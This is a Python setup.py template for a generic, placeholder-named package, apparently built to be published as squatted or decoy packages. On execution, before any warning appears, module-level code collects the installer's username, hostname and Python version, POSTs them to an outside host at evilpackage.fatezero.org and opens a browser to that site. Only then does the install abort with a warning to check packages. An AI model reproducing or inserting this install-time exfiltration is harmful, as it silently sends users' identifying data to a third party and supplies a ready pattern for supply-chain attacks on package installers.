#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import sys
import json
import getpass
import hashlib
import platform
import tempfile
import webbrowser
import setuptools
from setuptools.command.install import install


def request(url, method='GET', data=None, headers=None):
    headers = headers or {}
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def fun():
    username = getpass.getuser()
    hostname = platform.node()

    filename = os.path.join(
        tempfile.gettempdir(),
        hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()
    )

    if os.path.exists(filename):
        return

    try:
        open(filename, 'w').write(b'')
    except:
        pass

    data = {
        "username": str(username),
        "hostname": str(hostname),
        "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
        "package": "{{ cookiecutter.package_name }}",
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        request(
            url="http://evilpackage.fatezero.org/evilpy",
            method='POST',
            data=json.dumps(data).encode("utf-8", errors='ignore'),
            headers=headers
        )
    except:
        pass

    try:
        webbrowser.open("http://evilpackage.fatezero.org/")
    except:
        pass


fun()


class AbortInstall(install):
    def run(self):
        raise SystemExit(
            "[+] It looks like you try to install {{ cookiecutter.package_name }} without checking it.\n"
            "[-] is that alright? \n"
            "[*] Please visit http://evilpackage.fatezero.org/ \n"
            "[/] Aborting installation."
        )


setuptools.setup(
    name="{{ cookiecutter.package_name }}",
    version="{{ cookiecutter.package_version }}",
    url="http://evilpackage.fatezero.org/",

    author="{{ cookiecutter.author_name }}",
    author_email="{{ cookiecutter.author_email }}",

    description="{{ cookiecutter.package_desc }}",
    long_description=open('README.rst').read(),

    packages=setuptools.find_packages(),
    cmdclass={
        'install': AbortInstall
    },

    install_requires=[],

    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)


